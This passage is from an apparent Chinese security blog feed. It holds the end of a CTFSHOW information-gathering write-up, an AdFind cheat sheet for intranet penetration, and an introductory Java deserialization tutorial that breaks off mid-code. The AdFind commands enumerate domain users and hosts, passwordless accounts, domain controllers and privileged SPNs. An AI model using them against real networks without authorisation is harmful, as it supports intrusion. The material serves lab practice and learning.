alt=""></p><p>结合上面的邮箱，发现是QQ邮箱，去搜索一下其QQ，发现所在地</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/15_03.png" alt=""></p><p>提交所在地后，发现重置密码，登录，获得flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/15_04.png" alt=""></p><h1 id="web16-探针"><a href="#web16-探针" class="headerlink" title="web16( 探针)"></a>web16( 探针)</h1><p>根据提示可知，本题需要用到探针</p><p>尝试<code>tz.php</code>，发现是雅黑探针</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/16.png" alt=""></p><p>浏览了一下，发现没有有用的信息，访问一下phpinfo</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/16_01.png" alt="">找到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/16_02.png" alt=""></p><h1 id="web18-js"><a href="#web18-js" class="headerlink" title="web18(js)"></a>web18(js)</h1><p>打开后发现是个游戏，提示告诉我们需要玩到101分，那必不可能玩游戏，直接下载源码，找到score的值，将其修改1000分</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/17.png" alt=""></p><p>使代码在本地跑，过关！得到提示</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/17_01.png" alt=""></p><p>访问<code>110.php</code>得到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/17_02.png" alt=""></p><h1 id="web19"><a href="#web19" class="headerlink" title="web19()"></a>web19()</h1><p>查看源码。发现提示</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/18_01.png" alt=""></p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/18.png" alt=""></p><p>发现这是一段加密的脚本，会将密码进行AES加密</p><p>只需要按照注释中的代码，post传参即可</p><p><code>payload: username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/18_02.png" alt=""></p><h1 id="web20"><a href="#web20" class="headerlink" title="web20()"></a>web20()</h1><p>打开后，发现提示</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/19.png" alt=""></p><p>根据题目描述：<strong>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了</strong></p><p>尝试扫描目录</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/20_01.png" alt=""></p><p>查看文件，搜索flag，拿到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/19_01.png" alt=""></p><h1 id="web17"><a href="#web17" class="headerlink" title="web17()"></a>web17()</h1><p>发现需要寻找sql文件，直接扫目录</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/20.png" alt=""></p><p>发现sql文件，下载，查看，拿到flag</p><p><img src="/img/CTFSHOW-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/20_02.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AdFind</title>
      <link href="/2023/08/07/AdFind/"/>
      <url>/2023/08/07/AdFind/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>工具链接：<a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p><h1 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h1><p>AdFind是一款C++语言编写的域中信息查询工具，可以在域中任何一台主机上使用，在内网渗透使用率较高</p><p>语法格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe [switches] [-b baseden] [-f filter] [attr list]</span><br></pre></td></tr></table></figure><p>其中，<code>-b</code>指定一个BaseDN作为查询的根，<code>-f</code>为LDAP过滤条件，<code>attr list</code> 为需要显示的属性。</p><p>例：</p><p>执行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b dc=hack-my,dc=com -f &quot;objectClass=computer&quot; name operatingSystem</span><br></pre></td></tr></table></figure><p>查询 hack-my.com 域中的所欲computer对象，并过滤对象的<code>name</code>和<code>operatingSystem</code>属性</p><p>执行以下命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b dc=hack-my,dc=com -f &quot;objectClass=user&quot; cn</span><br></pre></td></tr></table></figure></p><p>查询 hack-my.com 域中的所有 user 对象，并过滤对象的<code>cn</code>属性</p><h1 id="常用查询命令"><a href="#常用查询命令" class="headerlink" title="常用查询命令"></a>常用查询命令</h1><p><strong>查询域中机器</strong></p><ul><li><p>查询 hack-my.com 域的所有 computer 对象并显示所有属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b dc=hack-my,dc=com -f &quot;objectClass=computer&quot;</span><br></pre></td></tr></table></figure></li><li><p>查询 hack-my.com 域的所欲 computer 对象并过滤对象的 name 和 operatingSystem 属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b dc=hack-my,dc=com -f &quot;objectClass=computer&quot; name operatingSystem</span><br></pre></td></tr></table></figure></li><li><p>查询指定主机的相关信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc c:&lt;Name/SamAccountName&gt;</span><br></pre></td></tr></table></figure></li><li><p>查询当前域中主机的数量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc adobjcnt:computer</span><br></pre></td></tr></table></figure></li><li><p>查询当前域中被禁用的主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Adfind.exe -sc computers_disabled</span><br></pre></td></tr></table></figure></li><li><p>查询当前域中不需要密码的主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc computers_pwdnotreqd</span><br></pre></td></tr></table></figure></li><li><p>查询当前域中在线的计算机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc computers_active</span><br></pre></td></tr></table></figure></li></ul><p><strong>查询域中用户</strong></p><ul><li><p>查询 hack-my.com 域的所有 user 对象并过滤对象的cn属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b dc=hack-my,dc=com -f&quot;objectClass-user&quot;cn</span><br></pre></td></tr></table></figure></li><li><p>查询当前登录的用户信息和 Token</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc whoami</span><br></pre></td></tr></table></figure></li><li><p>查询指定用户的相关信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc u:&lt;Name/SamAccountName&gt;</span><br></pre></td></tr></table></figure></li><li><p>查询当前域中用户的数量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc adobjcnt;user</span><br></pre></td></tr></table></figure></li><li><p>查询当前域中被禁用的用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc users disabled</span><br></pre></td></tr></table></figure></li><li><p>查询域中密码永不过期的用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc users noexpire</span><br></pre></td></tr></table></figure></li><li><p>查询当前域中不需要密码的用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc users_pwdnotreqd</span><br></pre></td></tr></table></figure></li></ul><p><strong>查询域控制器</strong></p><ul><li><p>查询当前域中所有域控制器(返回 FQDN 信息)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc dclist</span><br></pre></td></tr></table></figure></li><li><p>查询当前域中所有只读域控制器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc dclist:rodc</span><br></pre></td></tr></table></figure></li><li><p>查询当前域中所有可读写域控制器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc dclist:!rodc</span><br></pre></td></tr></table></figure></li></ul><p><strong>其他查询</strong></p><ul><li><p>查询所有的组策略对象并显示所有属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc gpodmp</span><br></pre></td></tr></table></figure></li><li><p>查询域信任关系</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -f&quot;objectclass=trusteddomain&quot;</span><br></pre></td></tr></table></figure></li><li><p>查询 hack-my.com 域中具有高权限的 SPN</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe-b&quot;DC-hack-my.DC-com”-f&quot;&amp;(servicePrincipalName=*)(admincount=1)&quot;servicePrincipalName</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Intranet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化</title>
      <link href="/2023/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/08/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p> Java序列化是指把Java对象转换为字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。</p><p>序列化分为两大部分：序列化和反序列化。序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例</p><h2 id="为什么需要序列化与反序列化"><a href="#为什么需要序列化与反序列化" class="headerlink" title="为什么需要序列化与反序列化"></a>为什么需要序列化与反序列化</h2><p> 我们知道，当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要Java序列化与反序列化了。换句话说，一方面，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象</p><p>当我们明晰了为什么需要Java序列化和反序列化后，我们很自然地会想Java序列化的好处。其好处一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。</p><p>① 想把内存中的对象保存到一个文件中或者数据库中时候；<br>② 想用套接字在网络上传送对象的时候；<br>③ 想通过RMI传输对象的时候</p><blockquote><p>一些应用场景，涉及到将对象转化成二进制，序列化保证了能够成功读取到保存的对象。</p></blockquote><h2 id="几种常见的序列化和反序列化协议"><a href="#几种常见的序列化和反序列化协议" class="headerlink" title="几种常见的序列化和反序列化协议"></a>几种常见的序列化和反序列化协议</h2><ul><li><p>XML&amp;SOAP</p><p>XML 是一种常用的序列化和反序列化协议，具有跨机器，跨语言等优点，SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议</p></li><li><p>JSON（Javascript Object Notation）</p></li><li>Protobuf</li></ul><h1 id="序列化实现"><a href="#序列化实现" class="headerlink" title="序列化实现"></a>序列化实现</h1><p>只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常） </p><p><img src="/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java.png" alt=""></p><p><strong>Serializable 接口</strong></p><p>是 Java 提供的序列化接口，它是一个空接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Serializable 用来标识当前类可以被 <code>ObjectOutputStream</code> 序列化，以及被 <code>ObjectInputStream</code> 反序列化</p><h2 id="Serializable-接口的基本使用"><a href="#Serializable-接口的基本使用" class="headerlink" title="Serializable 接口的基本使用"></a>Serializable 接口的基本使用</h2><p>通过 <code>ObjectOutputStream</code> 将需要序列化数据写入到流中，因为 Java IO 是一种装饰者模式，因此可以通过 <code>ObjectOutStream</code> 包装 <code>FileOutStream</code> 将数据写入到文件中或者包装 <code>ByteArrayOutStream</code> 将数据写入到内存中。同理，可以通过 <code>ObjectInputStream</code> 将数据从磁盘 <code>FileInputStream</code> 或者内存 <code>ByteArrayInputStream</code> 读取出来然后转化为指定的对象即可</p><p><img src="/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java_01.png" alt=""></p><p><img src="/img/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java_02.png" alt=""></p><h2 id="Serializable-接口的特点"><a href="#Serializable-接口的特点" class="headerlink" title="Serializable 接口的特点"></a>Serializable 接口的特点</h2><p><strong>1. 序列化类的属性没有实现 Serializable 那么在序列化就会报错</strong></p><blockquote><p>具体可以跟进 ObjectOutputStream#writeObject() 源码查看具体原因</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.io.NotSerializableException: com.example.seriable.Color</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Color 类也是需要实现序列化接口的。</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">private</span> Color color;<span class="comment">//这里如果没有实现序列化接口，那么在 Student 对象序列化时将会报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2. 在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造函数来重新创建对象</strong></p><p>Animal 是父类，它没有实现 Serilizable 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String color;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">()</span> &#123;<span class="comment">//没有无参构造将会报错</span></span><br><span class="line">        System.out.println(<span class="string">&quot;调用 Animal 无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String color)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line"> </span><br><span class="line">            System.out.println(<span class="string">&quot;调用 Animal 有 color 参数的构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Animal&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;color=&#x27;&quot;</span> + color + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlackCat 是 Animal 的子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlackCat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlackCat</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;调用黑猫的无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlackCat</span><span class="params">(String color, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(color);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用黑猫有 color 参数的构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;BlackCat&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +<span class="built_in">super</span>.toString() +<span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SuperMain 测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SuperMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;./super.bin&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serializeAnimal();</span><br><span class="line">        deserializeAnimal();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeAnimal</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BlackCat</span> <span class="variable">black</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BlackCat</span>(<span class="string">&quot;black&quot;</span>, <span class="string">&quot;我是黑猫&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化前：&quot;</span>+black.toString());</span><br><span class="line">        System.out.println(<span class="string">&quot;=================开始序列化================&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(FILE_PATH));</span><br><span class="line">        oos.writeObject(black);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeAnimal</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=================开始反序列化================&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FILE_PATH));</span><br><span class="line">        <span class="type">BlackCat</span> <span class="variable">black</span> <span class="operator">=</span> (BlackCat) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(black);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">调用 Animal 有 color 参数的构造</span><br><span class="line">    </span><br><span class="line">调用黑猫有 color 参数的构造</span><br><span class="line"> </span><br><span class="line">序列化前：BlackCat&#123;name=<span class="string">&#x27;我是黑猫&#x27;</span>Animal&#123;color=<span class="string">&#x27;black&#x27;</span>&#125;<span class="string">&#x27;&#125;</span></span><br><span class="line"><span class="string">=================开始序列化================</span></span><br><span class="line"><span class="string">=================开始反序列化================</span></span><br><span class="line"><span class="string">调用 Animal 无参构造</span></span><br><span class="line"><span class="string">BlackCat&#123;name=&#x27;</span>我是黑猫<span class="string">&#x27;Animal&#123;color=&#x27;</span><span class="literal">null</span><span class="string">&#x27;&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>从上面的执行结果来看，如果要序列化的对象的父类 Animal 没有实现序列化接口，那么在反序列化时是会调用对应的无参构造方法的，这样做的目的是重新初始化父类的属性，例如 Animal 因为没有实现序列化接口，因此对应的 color 属性就不会被序列化，因此反序列得到的 color 值就为 null</p><p><strong>对上面的2个操作文件流的类的简单说明</strong></p><ul><li><code>ObjectOutputStream</code>代表对象输出流：</li></ul><p>它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中</p><ul><li><code>ObjectInputStream</code>代表对象输入流：</li></ul><p>它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回</p><p><strong>3. 一个实现 Serializable 接口的子类也是可以被序列化的</strong></p><p><strong>4. 静态成员变量是不能被序列化</strong></p><p>序列化是针对对象属性的，而静态成员变量是属于类的 </p><p><strong>5. transient 标识的对象成员变量不参与序列化</strong></p><p>在下面这个例子中，MyList 这个类定义了一个 arr 数组属性，初始化的数组长度为 100。在实际序列化时如果让 arr 属性参与序列化的话，那么长度为 100 的数组都会被序列化下来，但是我在数组中可能只存放 30 个数组而已，这明显是不可理的，所以这里就要自定义序列化过程啦，具体的做法是写以下两个 private 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span><span class="keyword">throws</span> java.io.IOException</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span><span class="keyword">throws</span> java.io.IOException, ClassNotFoundException</span><br></pre></td></tr></table></figure><p>从这两个方法的名字就可以看出分别是序列化写入数据和反序列化读取数据用的</p><p><strong>transient 应用:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyList</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    transient 表示该成员 arr 不需要被序列化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object[] arr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        给前面30个元素进行初始化</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.arr[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span 